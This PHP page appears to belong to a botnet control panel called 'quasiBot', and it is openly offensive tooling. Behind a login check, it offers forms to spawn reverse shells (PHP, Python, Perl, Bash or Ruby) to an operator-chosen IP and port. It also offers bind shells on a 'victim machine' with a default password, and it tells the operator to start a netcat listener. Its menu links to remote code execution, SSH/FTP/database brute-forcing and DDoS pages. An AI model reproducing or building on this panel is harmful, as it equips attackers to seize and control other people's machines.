<?php

require('../config.php');
auth();

?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">


<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
    <title>quasiBot | shell</title>
    <link href="../style.css" rel="stylesheet" type="text/css" media="screen" />
</head>
<body>
<div id="wrapper">
    <div id="header">


        <div id="logo">
            <h1><a href="../index.php">&nbsp; &nbsp; &nbsp;<?php echo date('H:i:s') ?></a></h1>

<?php
quotes();
?>

        </div>
    </div>
    <div id="menu">
        <ul>
            <li class="txt_left"><?php echo $_SERVER['DOCUMENT_ROOT'] ?></li>
            <li class="txt_left"><?php echo $_SERVER['PHP_SELF'] ?></li>
            <li class="txt_center"><?php echo date("d.m.y"); ?></li>
            <li class="txt_right"><?php echo $_SERVER['SERVER_ADDR'] ?></li>
            <li class="txt_right"><?php echo $_SERVER['SERVER_NAME'] ?></li>
            <li class="txt_right"><?php echo conn('http://bot.whatismyipaddress.com/') ?></li>
        </ul>
    </div>
    <div id="page">
        <div id="page-bgtop">
            <div id="page-bgbtm">
                <div id="content">

                    <div class="post">
                        <h2 class="title"><a href="#">Bots</a></h2>
                        <div class="entry">
                            <p class="meta">
                            <?php
                            checkbots();
                            ?>
                            </p>
                        </div>
                    </div>

                    <div class="post">
                        <h2 class="title"><a href="#">Reverse Shell</a></h2>
                        <div class="entry">
                            <p class="meta"> 
                            Spawn reverse shell to your machine &nbsp;&bull;&nbsp; Remember to set netcat listener: nc -v -n -l -p [PORT]
                            </p>

                            <form method="post">
                            <table>
                            <tr>
                            <td><b>ID</b></td>
                            <td><b>SHELL</b></td>
                            <td><b>IP</b></td>
                            <td><b>PORT</b></td>
                            </tr>
                            <tr>
                            <td>
                            <b>
                            <?php
                             echo "<input type=\"text\" style=\"width: 50px;\" value=\"". (empty($_POST['id'])?"0":htmlspecialchars($_POST['id'])) ."\" name=\"id\"></b>";
                            ?>
                            </td>
                            <td style="text-align: left;">
                            <input type="radio" name="func" value="php" checked="checked"> PHP<br/>
                            <input type="radio" name="func" value="python"> Python<br/>
                            <input type="radio" name="func" value="perl"> Perl<br/>
                            <input type="radio" name="func" value="bash"> Bash<br/>
                            <input type="radio" name="func" value="ruby"> Ruby<br/>
                            </td>
                            <td>
                            <?php
                             echo "<input type=\"text\" style=\"width: 350px;\" value=\"". (empty($_POST['ip'])?"192.168.0.100":htmlspecialchars($_POST['ip'])) ."\" name=\"ip\"></b>";
                            ?>
                            </td>
                            <td>
                            <?php
                             echo "<input type=\"text\" style=\"width: 70px;\" value=\"". (empty($_POST['port'])?"1337":htmlspecialchars($_POST['port'])) ."\" name=\"port\"></b>";
                            ?>
                            </td>
                            <td><input type="submit" value="Go"></td>
                            </tr>
                            </table>
                            </form>

                            <?php

                            reverse_shell();

                            ?>


                        </div>
                    </div>
                    <div class="post">
                        <h2 class="title"><a href="#">Bind Shell</a></h2>
                        <div class="entry">
                            <p class="meta"> 
                            Spawn Bind Shell on victim machine &nbsp;&bull;&nbsp; Shell exists as long as this window will be opened
                            </p>


                            <form method="post">
                            <table>
                            <tr>
                            <td><b>ID</b></td>
                            <td><b>Password</b></td>
                            <td><b>PORT</b></td>
                            </tr>
                            <tr>
                            <td>
                            <b>
                            <?php
                             echo "<input type=\"text\" style=\"width: 50px;\" value=\"". (empty($_POST['bindid'])?"0":htmlspecialchars($_POST['bindid'])) ."\" name=\"bindid\"></b>";
                            ?>
                            </td>
                            <td>
                            <?php
                             echo "<input type=\"text\" style=\"width: 350px;\" value=\"". (empty($_POST['bindpassword'])?"p4ssw0rd":htmlspecialchars($_POST['bindpassword'])) ."\" name=\"bindpassword\"></b>";
                            ?>
                            </td>
                            <td>
                            <?php
                             echo "<input type=\"text\" style=\"width: 70px;\" value=\"". (empty($_POST['bindport'])?"1337":htmlspecialchars($_POST['bindport'])) ."\" name=\"bindport\"></b>";
                            ?>
                            </td>
                            <td><input type="submit" value="Go"></td>
                            </tr>
                            </table>
                            </form>

                            <?php

                            bind_shell();

                            ?>


                        </div>
                    </div>
                    <div style="clear: both;">&nbsp;</div>
                </div>
                <!-- end #content -->
                <div id="sidebar">
                    <ul>
                        <li>
                            <h2>Home</h2>
                            <ul>
                                <li><a href="../home/index.php">Index</a></li>
                                <li><a href="../home/settings.php">Settings</a></li>
                                <li><a href="../home/rss.php">RSS</a></li>
                            </ul>
                        </li>
                        <li>
                           <h2>Hack</h2>
                            <ul>
                                <li><a href="rce.php">RCE</a></li>
                                <li><a href="scan.php">Scan</a></li>
                                <li><a href="pwn.php">Pwn</a></li>
                                <li><a href="shell.php"><b>Shell</b></a></li>
                            </ul>
                        </li>
                        <li>
                           <h2>Bruteforce</h2>
                            <ul>
                                <li><a href="../bf/ssh.php">SSH</a></li>
                                <li><a href="../bf/ftp.php">FTP</a></li>
                                <li><a href="../bf/dbs.php">DB's</a></li>
                                <li><a href="../bf/www.php">WWW</a></li>
                            </ul>
                        </li>
                        <li>
                           <h2>Tools</h2>
                            <ul>
                                <li><a href="../tools/sql.php">MySQL Manager</a></li>
                                <li><a href="../tools/hostscan.php">HostScan</a></li>
                             </ul>
                        </li>
                        <li>
                           <h2>Bots</h2>
                            <ul>
                                <li><a href="ddos.php">DDoS</a></li>
                                <li><a href="more.php">Run</a></li>
                             </ul>
                        </li>
                </div>
                <div style="clear: both;">&nbsp;</div>
            </div>
        </div>
    </div>
</div>
<div id="footer">
    <p><?php echo $_SERVER['SERVER_SOFTWARE']; echo '  -  '; echo $_SERVER['HTTP_USER_AGENT'] ?></p>
</div>
</body>
</html>
